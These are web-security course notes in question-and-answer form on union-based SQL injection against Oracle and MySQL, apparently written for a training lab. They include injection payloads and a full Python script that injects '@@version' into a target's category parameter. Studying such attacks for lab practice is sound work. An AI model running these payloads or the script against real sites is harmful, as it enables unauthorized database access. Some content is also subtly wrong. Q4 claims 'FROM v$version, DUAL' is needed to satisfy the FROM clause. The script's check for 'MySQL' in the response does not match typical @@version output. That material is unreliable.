---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the purpose of determining the number of columns in a union-based SQL injection attack.**

Determining the number of columns in a union-based SQL injection attack is crucial because it ensures that the injected SQL query aligns with the structure of the original query. If the number of columns does not match, the SQL query will fail due to a mismatch in the number of columns returned by the injected query and the original query. By identifying the correct number of columns, an attacker can craft a successful union-based SQL injection that retrieves desired information without causing syntax errors.

**Q2. How would you exploit a union-based SQL injection to determine the version of an Oracle database?**

To exploit a union-based SQL injection to determine the version of an Oracle database, follow these steps:

1. Identify the vulnerable parameter in the application, such as the `category` parameter in the URL.
2. Use a payload to determine the number of columns in the original query. For example, use `ORDER BY` to incrementally test the number of columns until an error occurs.
3. Determine the data types of the columns by injecting payloads that test compatibility with string data types.
4. Use the `UNION SELECT` statement to inject a query that retrieves the database version. For Oracle, the payload might look like:
   ```sql
   ' UNION SELECT banner FROM v$version -- 
   ```
   Ensure to URL encode the payload before sending it.
5. Analyze the response to extract the database version string.

**Q3. Why is it necessary to include a `FROM` clause in SQL injection attacks targeting Oracle databases?**

Oracle databases require a `FROM` clause in SQL statements, even if the query does not involve selecting data from a specific table. This is because Oracle enforces the presence of a `FROM` clause to ensure syntactic correctness. Without a valid `FROM` clause, the SQL statement will result in a syntax error. To bypass this requirement in SQL injection attacks, attackers often use the `DUAL` table, which is a special one-row table available by default in Oracle databases. This allows the query to be syntactically correct while still enabling the injection of malicious SQL.

**Q4. Explain how the `DUAL` table is used in SQL injection attacks against Oracle databases.**

The `DUAL` table is a special one-row table present in Oracle databases that can be queried without needing to specify actual data. In SQL injection attacks, the `DUAL` table is used to provide a valid `FROM` clause when constructing injection payloads. This is necessary because Oracle requires a `FROM` clause in SQL statements, even if the query does not involve selecting data from a specific table. By including `FROM DUAL` in the injected SQL, attackers can ensure that their query is syntactically correct and can execute without causing a syntax error.

For example, to retrieve the database version using a union-based SQL injection, the payload might look like:
```sql
' UNION SELECT banner FROM v$version, DUAL -- 
```
Here, `DUAL` is included to satisfy the `FROM` clause requirement.

**Q5. How would you modify the given Python script to handle SQL injection attacks on MySQL databases instead of Oracle databases?**

To modify the given Python script to handle SQL injection attacks on MySQL databases instead of Oracle databases, the following changes need to be made:

1. Update the SQL payload to retrieve the database version from MySQL-specific system variables. For MySQL, the payload might look like:
   ```sql
   ' UNION SELECT @@version -- 
   ```

2. Modify the regular expression to match the MySQL version string format. For example:
   ```python
   version = soup.find(text=re.compile(r'^MySQL'))
   ```

3. Adjust the error handling and response parsing logic to account for differences in the response structure between Oracle and MySQL databases.

Here is the modified Python script:

```python
import requests
import sys
import urllib.parse
import re
from bs4 import BeautifulSoup

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_version(url):
    # Set proxy settings
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    
    # SQL payload for MySQL
    sql_payload = "' UNION SELECT @@version -- "
    
    # Construct the full URL with the payload
    full_url = f"{url}/filter?category={urllib.parse.quote(sql_payload)}"
    
    # Make the GET request
    response = requests.get(full_url, verify=False, proxies=proxies)
    
    # Check if the SQL injection worked
    if "MySQL" in response.text:
        print("[+] Found the database version.")
        
        # Parse the response to extract the version
        soup = BeautifulSoup(response.text, 'html.parser')
        version = soup.find(text=re.compile(r'^MySQL'))
        if version:
            print(f"[+] MySQL database version is {version}")
            return True
    
    print("[-] Unable to dump the database version.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] Dumping the version of the database...")
    
    if not exploit_sqli_version(url):
        print("[-] Failed to dump the database version.")
```

This script now handles SQL injection attacks on MySQL databases by modifying the payload and adjusting the regular expression to match the MySQL version string.

---
<!-- nav -->
[[04-Querying Database Type and Version|Querying Database Type and Version]] | [[Web Security (PortSwigger)/02-SQL Injection/08-Lab 7 SQL injection attack querying the database type and version on Oracle/00-Overview|Overview]]
